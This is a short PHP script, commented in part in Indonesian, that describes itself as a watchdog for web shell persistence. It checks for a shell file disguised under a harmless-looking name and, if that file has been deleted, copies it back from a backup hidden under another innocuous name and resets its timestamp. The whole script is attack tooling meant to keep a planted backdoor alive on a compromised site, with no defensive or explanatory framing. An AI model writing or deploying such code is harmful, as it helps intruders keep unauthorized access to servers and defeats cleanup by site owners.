<?php
// Simple watchdog script for shell persistence
$shell = "TranslationNotificationRecipientSetAuth.php";
$backup = "UserProfiles/FollowResultData.php";

// Jika shell utama tidak ada, restore dari backup
if (!file_exists($shell)) {
    if (file_exists($backup)) {
        copy($backup, $shell);
        touch($shell);
    }
}
?>
